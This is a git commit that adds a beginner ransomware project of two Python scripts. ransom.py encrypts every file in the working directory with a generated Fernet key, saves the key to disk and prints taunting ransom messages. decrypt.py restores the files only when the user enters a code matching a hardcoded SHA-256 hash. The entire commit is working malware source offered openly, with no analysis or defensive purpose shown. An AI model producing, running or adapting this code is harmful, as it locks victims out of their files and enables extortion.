6f7c0bd08555f7fca3ea533e26cbb1c84fc43881
miskuro <159482765+miskuro@users.noreply.github.com>
2024-04-22 14:45:35 +0100

    Add files via upload

---
+++ begginner-ransom/decrypt.py
@@ -0,0 +1,41 @@
+
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+import hashlib
+
+files = []
+
+for file in os.listdir():
+	if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+
+code = input("What is the code:\n")
+realCode = "0bd2efc433def2b85bfe49eda9af8f6b5b8c477a0439bfb14136c4f1f95d0256"
+
+hashed_code = hashlib.sha256(code.encode()).hexdigest()
+
+
+
+
+with open("thekey.key", "rb") as key:
+	secretkey = key.read()
+
+
+
+if realCode == hashed_code:
+	for file in files:
+		with open(file, "rb") as thefile:
+			contents = thefile.read()
+		contents_decrypted = Fernet(secretkey).decrypt(contents)
+		with open(file, "wb") as thefile:
+			thefile.write(contents_decrypted)
+		print("alr  here ur files")
+else:
+	print("ye u aint getting them filess")
---
+++ begginner-ransom/ransom.py
@@ -0,0 +1,36 @@
+#!/usr/bin/env python3
+
+
+import time
+import os
+from cryptography.fernet import Fernet
+
+
+files = []
+
+for file in os.listdir():
+	if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+	thekey.write(key)
+
+
+for file in files:
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
+
+
+print("them files are gonn lil bro")
+time.sleep(1)
+print("if u see a file called decrypt")
+time.sleep(2)
+print("open it if u still want them files")
